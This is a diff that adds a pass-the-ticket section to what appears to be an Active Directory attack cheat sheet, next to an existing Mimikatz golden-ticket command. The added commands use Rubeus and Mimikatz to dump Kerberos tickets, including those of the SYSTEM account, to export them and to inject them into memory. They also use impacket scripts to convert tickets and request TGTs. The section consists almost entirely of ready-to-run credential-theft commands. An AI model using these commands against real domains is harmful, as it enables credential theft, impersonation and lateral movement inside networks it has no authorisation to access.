@@ -338,3 +338,37 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwar
 /sid:S-1-5-21-xxxxx-yyyyy-xxxxx /krbtgt:xxxxxxxxxxxxxxxxxx /startoffset:0 /endin:600
 /renewmax:10080 /ptt"' 
 ```
+
+### PTT ATTACK
+
+```jsx
+**WINDOWS**
+- Rubeus.exe dump /luid:0x3e7 (This dumps tickets for the SYSTEM account (LUID 0x3e7)
+- Rebeus.exe dump (Dump in a user session)
+- Rubeus.exe asktgt /user:USERNAME /password:PASSWORD /domain:DOMAIN /ptt 
+(To export a TGT in base64 or .kirbi format and inject in memory:)
+
+- Load dumped ticket in memory:
+Rubeus.exe ptt /ticket:<Base64 encoded ticket>
+
+- Load exported ticket from a file into memory:
+Rubeus.exe ptt /ticket:ticket.kirbi
+
+- Check ticket in memory
+klist
+
+- Export ticket from memory using mimikatz:
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+
+**LINUX**
+- Convert to kirbi
+python3 /path/to/impacket/ticket_converter.py ticket.ccache ticket.kirbi
+
+- Request TGT
+python3 GetTGT.py <domain>/<username>:<password>@<target_ip>
+
+```
